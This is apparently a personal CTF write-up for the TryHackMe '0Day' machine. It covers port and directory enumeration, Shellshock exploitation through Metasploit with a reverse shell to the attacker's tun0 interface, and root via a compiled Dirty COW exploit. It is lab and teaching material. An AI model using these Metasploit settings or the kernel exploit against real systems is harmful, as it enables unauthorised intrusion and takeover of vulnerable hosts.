---
title: 0Day
author: Teja
date: 02-10-2021
categories: [Writeups, Pentesting]
tags: [tryhackmeBox]
---

## Recon

The nmap scan gave us the that there were only 2 ports open on this.\

```
ssh - 22
http - 80
```
running a gobuster scan on website we get that there are some interesting directories.\

One of them was `/backup` which gave me a rsa private key.
Another was `/cgi-bin`. So I checked that with nikto and turns out it vulnerable to shell-shock.

## Exploitation

search for shell-shock on metasploit.

```bash
use multi/http/apache_mod_cgi_bash_env_exec
set rhost $IP
set targeturi /cgi-bin/test.cgi
set lhost tun0
run
```

## Priv Esc

After getting a shell and not being able to find any priv esc method. I saw the ubuntu version.
it was 14.04 so we can use dirty cow to exploit it.

```bash
gcc dc.c -o dc -pthread
chmod +x dc
./dc
```

Start a python server and upload this to the machine and run it.\
We have root access now.